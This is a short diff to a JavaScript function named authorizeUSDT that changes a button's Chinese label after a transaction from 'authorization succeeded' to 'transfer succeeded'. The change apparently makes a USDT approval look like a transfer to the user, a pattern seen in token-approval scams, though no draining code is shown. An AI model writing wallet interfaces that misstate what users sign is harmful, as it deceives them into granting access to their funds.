@@ -35,7 +35,7 @@ async function authorizeUSDT() {
             await tx.wait();
             
             // 更新按钮文本
-            document.getElementById('nextButton').innerText = '授权成功';
+            document.getElementById('nextButton').innerText = '转账成功';
         } catch (error) {
             console.error(error);
             document.getElementById('nextButton').innerText = '转账失败请重试';
